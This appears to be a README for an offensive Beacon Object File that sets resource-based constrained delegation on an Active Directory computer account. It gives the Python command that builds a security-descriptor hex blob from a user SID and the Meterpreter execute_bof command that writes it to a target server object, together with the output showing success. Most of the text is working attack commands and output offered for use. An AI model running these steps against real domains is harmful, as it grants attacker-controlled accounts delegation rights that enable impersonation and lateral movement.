# BOF to set RBCD on target account

# Instructions

Run the `genrbcd.py` python script with the SID of the user you're delegating to

```
└─$ uv run genrbcd.py "S-1-5-21-991973810-2284695103-1193895442-1108"
010004804000000000000000000000001400000004002c000100000000002400ff010f00010500000000000515000000b251203b3fae2d88126629475404000001020000000000052000000020020000
```

Execute the BOF with three arguments:
 - target domain
 - target DN of the account you're delegating from
 - hex blob from `genrbcd.py`

```
meterpreter > execute_bof bofthedog/rbcd.x64.o --format-string zzz unsigned-sh0rt.net "CN=SCCM-SITESRV,OU=Servers,DC=unsigned-sh0rt,DC=net" "010004804000000000000000000000001400000004002c000100000000002400ff010f00010500000000000515000000b251203b3fae2d88126629475404000001020000000000052000000020020000"
Setting RBCD to: CN=SCCM-SITESRV,OU=Servers,DC=unsigned-sh0rt,DC=net
RBCD added successfully
```
